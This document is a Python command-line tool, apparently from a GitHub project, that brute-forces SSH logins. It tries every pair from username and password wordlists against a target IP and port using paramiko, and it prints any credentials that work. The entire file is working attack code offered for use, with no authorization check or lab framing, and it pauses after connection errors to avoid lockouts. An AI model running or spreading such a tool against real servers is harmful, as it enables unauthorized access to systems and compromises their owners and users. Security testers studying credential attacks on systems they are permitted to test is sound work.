import paramiko
import time
import argparse

print("\033[93m")
print(r"""


   _____    _____   _    _   ____                   _            
  / ____|  / ____| | |  | | |  _ \                 | |            
 | (___   | (___   | |__| | | |_) |  _ __   _   _  | |_    ___       
  \___ \   \___ \  |  __  | |  _ <  | '__| | | | | | __|  / _ \      
  ____) |  ____) | | |  | | | |_) | | |    | |_| | | |_  |  __/      
 |_____/  |_____/  |_|  |_| |____/  |_|     \__,_|  \__|  \___| 

                                           Developer: Sreeraj                                                                                             
         
""")

print("\033[92m  * GitHub: https://github.com/s-r-e-e-r-a-j\033[0m\n")



def ssh_bruteforce(target_ip, target_port, username_wordlist, password_wordlist):
    
    # Open the username and password wordlists
    with open(username_wordlist, 'r') as ufile, open(password_wordlist, 'r') as pfile:
        usernames = ufile.readlines()
        passwords = pfile.readlines()

    # Iterate over all username and password combinations
    for username in usernames:
        username = username.strip()
        for password in passwords:
            password = password.strip()
            print(f"\033[94mTrying username: {username}, password: {password}\033[0m")

            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(hostname=target_ip, port=target_port, username=username, password=password, timeout=1, allow_agent=False, look_for_keys=False)
                print(f"\033[93mSuccess! Username: {username}, Password: {password}\033[0m")
                return username, password
            except paramiko.AuthenticationException:
                print("\033[31mIncorrect credentials.\033[0m")
            except paramiko.SSHException as e:
                print(f"\033[31mConnection error: {e}\033[0m")
                time.sleep(1)  # Pause to avoid lockouts on too many attempts
            finally:
                client.close()

    print("\033[93mNo valid username/password combination found in the wordlists.\033[0m")
    return None

def main():
    parser = argparse.ArgumentParser(description="SSH Brute-Forcing Tool with Username and Password Wordlists")
    parser.add_argument("target_ip", type=str, help="Target IP address of the SSH server")
    parser.add_argument("target_port", type=int, help="Target Port of the SSH server")
    parser.add_argument("username_wordlist", type=str, help="Path to the username wordlist file")
    parser.add_argument("password_wordlist", type=str, help="Path to the password wordlist file")
    
    args = parser.parse_args()

    ssh_bruteforce(args.target_ip, args.target_port, args.username_wordlist, args.password_wordlist)

if __name__ == "__main__":
    main()
